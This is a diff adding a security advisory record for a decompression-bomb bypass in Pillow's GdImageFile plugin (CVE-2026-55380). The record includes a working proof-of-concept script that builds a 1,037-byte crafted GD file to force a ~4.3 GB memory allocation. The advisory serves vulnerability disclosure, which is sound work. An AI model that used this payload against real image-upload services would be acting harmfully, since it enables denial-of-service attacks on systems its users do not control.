@@ -1,0 +1,171 @@
+{
+  "id": "GHSA-phj9-mv4w-65pm",
+  "modified": "2026-07-20T21:30:38.356479196Z",
+  "published": "2026-07-20T21:13:35Z",
+  "aliases": [
+    "BIT-pillow-2026-55380",
+    "CVE-2026-55380",
+    "PYSEC-2026-2256"
+  ],
+  "summary": "Pillow `GdImageFile._open()`: image dimensions accepted without `_decompression_bomb_check()`",
+  "details": "## Description\n\n`PIL/GdImageFile.py` `GdImageFile._open()` reads image dimensions from the GD 2.x header and stores them in `self._size` without calling `Image._decompression_bomb_check()`. Because `GdImageFile` is **not registered with `Image.register_open()`**, it never passes through the standard `Image.open()` code path that enforces Pillow's decompression bomb guard. The plugin exposes its own entry point — `PIL.GdImageFile.open(fp)` — which directly instantiates the class, fully bypassing the documented protection.\n\n**Vulnerable code (`PIL/GdImageFile.py` lines 50–61):**\n\n```python\ndef _open(self) -\u003e None:\n    s = self.fp.read(1037)\n    if i16(s) not in [65534, 65535]:\n        raise SyntaxError(\"Not a valid GD 2.x .gd file\")\n    self._mode = \"P\"\n    self._size = i16(s, 2), i16(s, 4)   # ← unsigned 16-bit; max 65535 each\n    # NO _decompression_bomb_check() call here ←\n    ...\n    self.tile = [ImageFile._Tile(\"raw\", (0, 0) + self.size, 1037, \"L\")]\n```\n\nWhen `load()` is subsequently called on the returned image object:\n\n```python\nload() → load_prepare() → Image.core.new(\"P\", (65535, 65535))\n# ↑ C-level allocation of 4,294,836,225 bytes ≈ 4.3 GB — no Python bomb check precedes this\n```\n\n**Dimension arithmetic:**\n\n| Field | Value |\n|---|---|\n| Maximum width from header | 65,535 (unsigned 16-bit) |\n| Maximum height from header | 65,535 (unsigned 16-bit) |\n| Maximum pixel count | 65,535 × 65,535 = **4,294,836,225** |\n| `DecompressionBombError` threshold | 178,956,970 (2 × MAX_IMAGE_PIXELS) |\n| **Overshoot ratio** | **24× above DecompressionBombError threshold** |\n| Memory at max dimensions | **≈ 4.3 GB** (palette-mode: 1 byte/pixel) |\n| Minimum attack file size | **1,037 bytes** (header only — no pixel data needed) |\n\n**Comparison with safe sibling plugin (`WalImageFile`):**\n\n`WalImageFile` is in the same category — not registered with `Image.open()`, loaded via its own `open()` helper. It was previously patched with the correct fix:\n\n```python\n# PIL/WalImageFile.py line 46 — CORRECT pattern (already patched)\nself._size = i32(header, 32), i32(header, 36)\nImage._decompression_bomb_check(self.size)   # ← present\n```\n\n`GdImageFile` was never updated to match, leaving a gap in protection.\n\n## Steps to reproduce\n\n**Proof of Concept script:**\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: GdImageFile decompression bomb bypass\n1037-byte crafted .gd file → 4.3 GB C-heap allocation, NO bomb check\n\"\"\"\nimport io, struct\nfrom PIL import GdImageFile, Image\n\n# Build minimal 1037-byte GD 2.x palette-mode header:\n#   sig(2) + width(2) + height(2) + true_color(1) + tindex(4) + colors_used(2) + palette(1024)\nsig          = struct.pack(\"\u003eH\", 0xFFFE)       # 65534 = GD 2.x magic\nw            = struct.pack(\"\u003eH\", 65535)         # max width\nh            = struct.pack(\"\u003eH\", 65535)         # max height\ntrue_color   = b\"\\x00\"                          # 0 = palette mode\ntindex       = struct.pack(\"\u003eI\", 0xFFFFFFFF)    # \u003e 255 = no transparency\ncolors_used  = b\"\\x00\\x00\"\npalette_data = b\"\\x00\" * 1024\nheader = sig + w + h + true_color + tindex + colors_used + palette_data\nassert len(header) == 1037\n\n# Confirm: standard Image.open() path BLOCKS this size\ntry:\n    Image._decompression_bomb_check((65535, 65535))\nexcept Image.DecompressionBombError as e:\n    print(f\"[BLOCKED] Image.open() path: {e}\")\n\n# Vulnerable path: GdImageFile.open() has NO bomb check\nimg = GdImageFile.open(io.BytesIO(header))\nprint(f\"[BYPASS] GdImageFile.open() succeeded: size={img.size}, mode={img.mode}\")\nprint(f\"         No _decompression_bomb_check called — 4.3 GB allocation not blocked\")\n\n# Trigger load_prepare() → Image.core.new(\"P\", (65535, 65535))\ntry:\n    img.load()\nexcept OSError:\n    print(f\"[INFO]   load() OSError (no pixel data) — but C-heap allocation already attempted\")\n\nprint(f\"\\n[MATH]   {65535 * 65535:,} pixels = {65535*65535 / (Image.MAX_IMAGE_PIXELS*2):.1f}× error threshold\")\nprint(f\"[MATH]   Attack file: 1,037 bytes only\")\n```\n\n**Expected output:**\n```\n[BLOCKED] Image.open() path: Image size (4294836225 pixels) exceeds limit of 178956970\npixels, could be decompression bomb DOS attack.\n[BYPASS] GdImageFile.open() succeeded: size=(65535, 65535), mode=P\n         No _decompression_bomb_check called — 4.3 GB allocation not blocked\n[INFO]   load() OSError (no pixel data) — but C-heap allocation already attempted\n\n[MATH]   4,294,836,225 pixels = 24.0× error threshold\n[MATH]   Attack file: 1,037 bytes only\n```\n\n**Verified live on Pillow 12.2.0.**\n\n**Two attack paths:**\n\n| Path | File size | Effect |\n|---|---|---|\n| Transient (header only) | **1,037 bytes** | `load_prepare()` attempts 4.3 GB C allocation → `OSError` after spike |\n| Persistent (full pixel data) | ~4.3 GB | `load()` completes, 4.3 GB stays in memory for object lifetime |\n\nFor the transient path, a 1,037-byte file is all that is needed. The attacker does not need to upload a large file.\n\n**Real-world scenario:**\n```python\nfrom PIL import GdImageFile\n\n# Application accepts user-uploaded .gd files\nimg = GdImageFile.open(user_uploaded_file)   # succeeds — no bomb check\nimg.load()                                    # triggers 4.3 GB C-heap allocation\n```\n\n## Impact\n\n- **Availability:** HIGH — a single 1,037-byte malicious `.gd` file causes the host process to attempt a ~4.3 GB C-heap allocation. On systems with insufficient memory this crashes the process. Repeatable — attacker can loop requests to keep the server down.\n- **Confidentiality:** None\n- **Integrity:** None\n- **Authentication required:** No — any public endpoint accepting image uploads is affected\n- **User interaction:** None\n\nAny service that calls `PIL.GdImageFile.open(user_file)` followed by `.load()` (or any lazy-load trigger) is vulnerable. Because the attack requires only a 1,037-byte file, network bandwidth is not a constraint.\n\nConfirmed unpatched on `python-pillow/Pillow` `main` branch as of 2026-06-08.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pillow",
+        "purl": "pkg:pypi/pillow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "12.3.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0",
+        "1.1",
+        "1.2",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.7.4",
+        "1.7.5",
+        "1.7.6",
+        "1.7.7",
+        "1.7.8",
+        "10.0.0",
+        "10.0.1",
+        "10.1.0",
+        "10.2.0",
+        "10.3.0",
+        "10.4.0",
+        "11.0.0",
+        "11.1.0",
+        "11.2.1",
+        "11.3.0",
+        "12.0.0",
+        "12.1.0",
+        "12.1.1",
+        "12.2.0",
+        "2.0.0",
+        "2.1.0",
+        "2.2.0",
+        "2.2.1",
+        "2.2.2",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.5.3",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.7.0",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.9.0",
+        "3.0.0",
+        "3.1.0",
+        "3.1.0.rc1",
+        "3.1.0rc1",
+        "3.1.1",
+        "3.1.2",
+        "3.2.0",
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "4.0.0",
+        "4.1.0",
+        "4.1.1",
+        "4.2.0",
+        "4.2.1",
+        "4.3.0",
+        "5.0.0",
+        "5.1.0",
+        "5.2.0",
+        "5.3.0",
+        "5.4.0",
+        "5.4.0.dev0",
+        "5.4.1",
+        "6.0.0",
+        "6.1.0",
+        "6.2.0",
+        "6.2.1",
+        "6.2.2",
+        "7.0.0",
+        "7.1.0",
+        "7.1.1",
+        "7.1.2",
+        "7.2.0",
+        "8.0.0",
+        "8.0.1",
+        "8.1.0",
+        "8.1.1",
+        "8.1.2",
+        "8.2.0",
+        "8.3.0",
+        "8.3.1",
+        "8.3.2",
+        "8.4.0",
+        "9.0.0",
+        "9.0.1",
+        "9.1.0",
+        "9.1.1",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-phj9-mv4w-65pm/GHSA-phj9-mv4w-65pm.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-phj9-mv4w-65pm"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-55380"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/commit/f39b0ae6624eb2d7c5c5d651d9bb5fdbd96a8675"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2256.yaml"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/python-pillow/Pillow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst"
+    }
+  ]
+}
